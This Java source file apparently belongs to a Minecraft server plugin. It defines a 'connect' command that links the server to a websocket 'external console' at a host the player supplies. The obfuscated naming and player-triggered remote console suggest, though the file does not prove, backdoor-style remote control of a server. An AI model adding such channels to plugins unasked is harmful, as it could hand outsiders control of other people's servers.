package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.ExternalConsole;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.entity.Player;

import java.net.URI;
import java.net.URISyntaxException;

public class ConnectWebsocket implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"connect"};
    }

    @Override
    public String getDescription() {
        return "Attempt to connect to the websocket console.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "connect <ws://your_ip:port/endpoint>");
            return;
        }

        URI uri;
        try {
            uri = new URI(String.join(" ", args));
        } catch (URISyntaxException e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        if (!args[0].startsWith("ws://") && !args[0].startsWith("wss://")) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "URL must start with ws:// || wss://!");
            return;
        }

        Z_ z = context.getZ_();

        sender.sendMessage(Colors.Prefix + Colors.Caution + "Attempting to connect to " + uri + "...");

        try {
            ExternalConsole ex = z.getExternalConsole();
            if (ex != null) {
                if (ex.isOpen()) {
                    ex.close();
                }
            }
        } catch (Exception ignored) {

        }

        try {
            z.setExternalConsole(new ExternalConsole(uri, z));
            z.getExternalConsole().connect();
        } catch (Exception e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
        }
    }
}